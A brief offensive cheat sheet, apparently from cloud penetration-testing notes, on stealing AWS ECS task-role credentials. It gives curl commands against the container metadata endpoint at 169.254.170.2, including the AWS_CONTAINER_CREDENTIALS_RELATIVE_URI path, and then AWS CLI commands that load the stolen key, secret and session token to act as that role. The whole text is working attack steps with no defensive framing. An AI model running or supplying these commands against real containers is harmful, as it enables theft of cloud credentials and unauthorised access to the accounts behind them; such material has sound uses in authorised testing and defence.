# ECS Task Metadata Credential Theft

ECS containers expose task metadata and credentials at `169.254.170.2` (not the EC2 IMDS `169.254.169.254`).

```bash
# Enumerate task metadata (no token required)
curl http://169.254.170.2/v2/metadata

# Steal task role credentials
curl http://169.254.170.2/v2/credentials/<uuid-from-AWS_CONTAINER_CREDENTIALS_RELATIVE_URI>
# or if the env var is set:
curl "http://169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}"
```

Use stolen `AccessKeyId` / `SecretAccessKey` / `Token`:
```bash
aws configure set aws_access_key_id <key>
aws configure set aws_secret_access_key <secret>
aws configure set aws_session_token <token>
aws iam get-caller-identity
```
